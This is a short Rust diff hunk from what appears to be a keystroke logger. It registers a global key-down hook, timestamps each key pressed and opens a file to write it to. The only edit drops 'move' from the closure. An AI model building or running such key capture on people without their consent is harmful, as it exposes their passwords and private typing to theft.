@@ -6,7 +6,7 @@ use std::fs;
 fn main() {
     let device_state = DeviceState::new();
     
-    let _guard = device_state.on_key_down(move |key| {
+    let _guard = device_state.on_key_down(|key| {
         let printable = Utc::now().to_string() + " " + &key.to_string()[..];
         let mut file = fs::OpenOptions::new()
             .write(true)
